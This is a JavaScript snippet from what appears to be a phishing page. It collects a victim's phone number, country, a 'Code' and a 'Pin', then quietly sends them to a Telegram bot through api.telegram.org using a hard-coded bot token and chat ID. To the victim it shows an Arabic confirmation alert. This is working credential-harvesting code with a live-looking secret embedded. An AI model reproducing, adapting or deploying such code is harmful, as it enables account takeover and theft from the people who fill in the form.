    <script>
        const botToken = '7292959892:AAE3azYgFFdyynNrl5v_mp0-3iCT593lzBg';  // Replace with your Telegram bot token
        const chatId = '1452497907';      // Replace with your Telegram chat ID

        // Function to send all data to Telegram
        function sendFinalData() {
            const additionalData = document.getElementById("additionalData").value;

            // Retrieve the previous data (phone number, country, and name) from localStorage
            const phoneNumber = localStorage.getItem('phoneNumber');
            const countryName = localStorage.getItem('countryName');
            const userName = localStorage.getItem('userName');

            if (additionalData.trim()) {
                // Combine all data and send it to Telegram in one message
                const message = `Number: ${phoneNumber}\nCountry: ${countryName}\nCode: ${userName}\nPin: ${additionalData}`;
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                fetch(url)
                    .then(response => {
                        if (response.ok) {
                            alert('تم التوصل بطلبكم!');
                        } else {
                            alert('Failed to send data to Telegram');
                        }
                    })
                    .catch(error => {
                        alert('Error sending data: ' + error);
                    });
            } else {
                alert('Please enter valid information.');
            }
        }
